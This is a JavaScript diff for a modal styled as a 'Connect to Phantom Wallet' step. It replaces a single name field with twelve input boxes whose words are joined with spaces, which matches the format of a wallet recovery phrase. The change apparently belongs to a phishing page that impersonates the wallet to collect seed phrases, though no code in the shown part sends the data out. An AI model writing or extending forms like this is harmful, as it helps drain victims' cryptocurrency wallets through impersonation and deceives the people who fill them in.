@@ -177,7 +177,10 @@ window.openPhantomModal = function() {
     const phantomStepConnect = document.getElementById("phantomStepConnect");
     const phantomStepConnected = document.getElementById("phantomStepConnected");
     if (!phantomModal) return;
-    document.getElementById("phantomNameInput").value = ""; // reset input
+// Reset 12 kotak nama jadi kosong lagi
+for(let i = 1; i <= 12; i++) {
+  document.getElementById("name" + i).value = "";
+}
     phantomStepConnect.classList.remove("hidden");
     phantomStepConnected.classList.add("hidden");
     phantomModal.classList.add("show");
@@ -199,11 +202,17 @@ window.doPhantomConnect = function() {
     const stepConnected = document.getElementById("phantomStepConnected");
     if (!btn) return;
 
-    demoWalletName = nameInput.value.trim();
-    if (demoWalletName === "") {
-        alert("Please connect to Phantom Wallet to Continue");
-        return;
-    }
+    let nameParts = [];
+for(let i = 1; i <= 12; i++) {
+  const val = document.getElementById("name" + i).value.trim();
+  if(val) nameParts.push(val);
+}
+demoWalletName = nameParts.join(" ");
+
+if (demoWalletName === "") {
+    alert("Please Connect to Phantom Wallet");
+    return;
+}
 
     btn.textContent = "Connecting...";
     btn.disabled = true;
